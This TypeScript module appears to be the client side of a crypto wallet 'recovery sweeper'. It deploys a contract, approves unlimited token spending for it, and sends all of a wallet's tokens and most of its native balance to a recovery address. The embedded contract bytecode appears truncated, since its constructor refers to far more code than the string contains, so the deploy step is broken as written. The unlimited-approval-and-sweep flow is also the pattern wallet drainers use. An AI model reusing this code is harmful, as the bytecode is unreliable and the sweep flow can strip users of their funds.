import { ContractFactory, Contract, MaxUint256, BrowserProvider } from 'ethers';

export const SWEEPER_ABI = [{"inputs": [{"internalType": "address", "name": "recovery_", "type": "address"}], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [], "name": "TransferFailed", "type": "error"}, {"inputs": [], "name": "ZeroAddress", "type": "error"}, {"inputs": [], "name": "recovery", "outputs": [{"internalType": "address", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"}, {"inputs": [{"internalType": "address[]", "name": "tokens", "type": "address[]"}], "name": "sweepTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address[]", "name": "tokens", "type": "address[]"}], "name": "sweepTokensAndNative", "outputs": [], "stateMutability": "payable", "type": "function"}, {"stateMutability": "payable", "type": "receive"}] as const;

export const SWEEPER_BYTECODE = "0x60a060405234801561000f575f80fd5b50604051610a7e380380610a7e83398101604081905261002e9161006b565b5f73ffffffffffffffffffffffffffffffffffffffff82166100615760405163d92e233d60e01b815260040160405180910390fd5b61006a81610097565b50506100c2565b5f6020828403121561007b575f80fd5b815173ffffffffffffffffffffffffffffffffffffffff8116811461009e575f80fd5b9392505050565b5f80546001600160a01b0319166001600160a01b0392909216919091179055565b6109ad806100cf5f395ff3fe" as const;

const ERC20_APPROVE_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address) view returns (uint256)',
] as const;

const storageKey = (chainId: number, recovery: string) =>
  `sweeper:${chainId}:${recovery.toLowerCase()}`;

export function loadSweeperAddress(chainId: number, recovery: string): string | null {
  try {
    return localStorage.getItem(storageKey(chainId, recovery));
  } catch {
    return null;
  }
}

export function saveSweeperAddress(chainId: number, recovery: string, addr: string) {
  try {
    localStorage.setItem(storageKey(chainId, recovery), addr);
  } catch {}
}

export async function deploySweeper(
  signer: any,
  recovery: string,
  onStatus?: (s: string) => void,
): Promise<string> {
  onStatus?.('Deploy RecoverySweeper — confirm in wallet…');
  const factory = new ContractFactory(SWEEPER_ABI, SWEEPER_BYTECODE, signer);
  const contract = await factory.deploy(recovery);
  onStatus?.('Waiting for deploy confirmation…');
  await contract.waitForDeployment();
  return await contract.getAddress();
}

export async function approveAndSweep(
  signer: any,
  provider: BrowserProvider,
  sweeperAddr: string,
  tokenAddresses: string[],
  sendNative: boolean,
  onStatus?: (s: string) => void,
): Promise<string | null> {
  const sender = await signer.getAddress();
  let lastHash: string | null = null;

  for (const tokenAddr of tokenAddresses) {
    try {
      const token = new Contract(tokenAddr, ERC20_APPROVE_ABI, signer);
      const bal: bigint = await token.balanceOf(sender);
      if (bal <= 0n) continue;
      const current: bigint = await token.allowance(sender, sweeperAddr);
      if (current >= bal) continue;
      onStatus?.(`Approve token ${tokenAddr.slice(0, 8)}… in wallet`);
      const tx = await token.approve(sweeperAddr, MaxUint256);
      lastHash = tx.hash;
      await tx.wait();
    } catch (e: any) {
      if (e?.code === 4001) throw e;
      onStatus?.(`Approve skipped: ${e?.message || 'error'}`);
    }
  }

  const sweeper = new Contract(sweeperAddr, SWEEPER_ABI, signer);
  let nativeValue = 0n;
  if (sendNative) {
    const bal = await provider.getBalance(sender);
    const feeData = await provider.getFeeData();
    const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
    const gasReserve = 250000n * maxFee * 12n / 10n;
    if (bal > gasReserve) nativeValue = bal - gasReserve;
  }

  onStatus?.('Sweep once — confirm in wallet…');
  const tx = await sweeper.sweepTokensAndNative(tokenAddresses, { value: nativeValue });
  lastHash = tx.hash;
  await tx.wait();
  return lastHash;
}
